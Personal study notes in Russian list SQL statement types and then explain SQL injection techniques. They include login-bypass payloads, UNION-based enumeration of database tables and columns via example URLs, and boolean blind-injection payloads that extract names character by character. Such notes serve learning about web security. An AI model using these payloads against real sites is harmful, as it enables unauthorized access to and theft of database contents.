***Операторы:***
**1. Операторы определения данных.**
    1.1 CREATE - создание объекта.
    1.2 ALTER - изменение объекта.
    1.3 DROP - удаление объекта.

**2. Операторы манипуляции с данными.**
    2.1 SELECT - выбор данных.
    2.2 INSERT - добавление данных.
    2.3 UPDATE - изменение данных.
    2.4 DELETE - удаление данных.
    2.5 UNION - объединяет два запроса в один.

3. Операторы доступа к данным.
    3.1 GRANT - разрешение на манипуляции с объектом.
    3.2 REVOKE - отзывает разрешения.
    3.3 DENY - запрет.
---------------------------------------------------------------

Виды SQL-injection:
1. Тип переменной.
    1.1 Числовой параметр.

Ex: SELECT * FROM somthing WHERE id=$id (не обрамлен кавычками)
Если подставить ', то вылетит ошибка.
Если ошибка не вылетела:
    * Инъекции нет.
    * ' фильтруются.
    * Выкл. вывод ошибок (blind inj)

    1.2. Строковый параметр.

Ex: SELECT * FROM somthing WHERE id='1" (обрамлен кавычками)
Если добавить ', то нарушится логика запроса. 

    1.3. Авторизация.

login и password.
Ex: SELECT * FROM  users WHERE login='login' and password='password'

Уязвимость в login:
SELECT * FROM users WHERE login='admin'-- and password='password'

Уязвимость в password:
password' OR login='admin'--

    1.4. Оператор LIKE.

Для оператора LIKE символ % - любая строка. 
Авторизация. В поле password вводим %
Ex: SELECT * FROM users WHERE login LIKE 'admin' AND password LIKE '%'
------------------------------------------------------------------

2. Тип инъекций.

    2.1 UNION-based
- У всех запросов должно быть одинаковое кол-во столбцов в запросе.
- Полное совпадение типов столбцов.
Ex: запрос 1 = SELECT id, user FROM users WHERE id=1
    запрос 2 = SELECT user, password FROM passwords WHERE id=1
SELECT user, value FROM table_1 UNION SELECT user, value FROM table_2 (добавление ALL после UNION выводит дубликаты)

Запрос который ничего не выведет.
SELECT user, date FROM table_1 UNION SELECT value FROM table_2 (несовпадение количества столбцов)

Запрос который ничего не выведет.
SELECT user, date FROM table_1 UNION SELECT user, string FROM table_2 (несовпадение типов столбцов)

Ex: http://something.com/logs.php?id=1 (адресная строка)
SELECT Users.user, Logs.log FROM Users, Logs WHERE Logs.sid=$id

Запрос на таблицы в базе:
http://something.com/logs.php?id=1 UNION SELECT TOP 10 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--

Запрос на имена колонок:
http://something.com/logs.php?id=1 UNION SELECT TOP 10 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="table name"--

По итогу получения названия всех колонок и таблиц можно получить логи всех пользователей:
http://something.com/logs.php?id=1 UNION SELECT Users.user, Logs.lo FROM Users, Logs WHERE Logs.sid = Users.id


    2.2 Blind injection
Не отображает ответы ошибок.

****Normal blind****

Ex: http://test.com/something.php?id=1
SELECT title, descr, body FROM something WHERE id=$id

http://test.com/something.php?id=1 and 1=1 (вернет то же самое)

http://test.com/something.php?id=1 and 1=0 (никогда не выполнится)
SELECT title, descr, body FROM something WHERE id=$id AND 1=0

Payloads для определения Blind-inj
AND true
AND false
'AND true-- -
'AND false-- -
'AND true %23
'AND false %23

Эксплуатация.
SELECT title, descr, body FROM something WHERE id=$id AND ASCII(substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1), 1,1))>100
SELECT title, descr, body FROM something WHERE id=$id AND X>100

ASCII(symbol) - возвращение кода символа по ascii
substring(string, start_symbol, count_symbol) - возвращение подстроки и строки
SELECT table_name - получить название таблицы.

Если Х>100 вернёт true(страница появилась), то название таблицы начинается не с ascii 100, а если вернет false(страница пропала), то начинается с ascii 100. 
Методом перебора узнаем название таблицы.

------Другой способ
Использование dual и LIKE.
% - строка произвольной длины.
_ - любой символ.

Ex: 'something.com' LIKE '%thing%' - true.
    'something.com' LIKE '%.c' - false.

    'test.com' LIKE '___t.c__' - true.
    'test.com' LIKE '___t.c_' - false.
```
SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() LIKE '%n%')
SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() LIKE '_______')
SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() = 'name_bd')
```
Получение имен таблиц через столбцы.
SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema = database() AND column_name LIKE '%user%' limit 0,1) LIKE '%')

Запрос состоит из 2х вложенных запросов
1. SELECT table_name FROM information_schema.columns WHERE table_schema = database() AND column_name LIKE '%user%' limit 0,1
    SELECT table_name - выдай имя таблицы.
    FROM information_schema.columns - из данных колонок.
    WHERE table_schema = database() - где, БД равна текущей.
    AND column_name LIKE '%user%' - и таблица содержит столбец в названии которого есть user.
    limit 0,1 - 1шт


































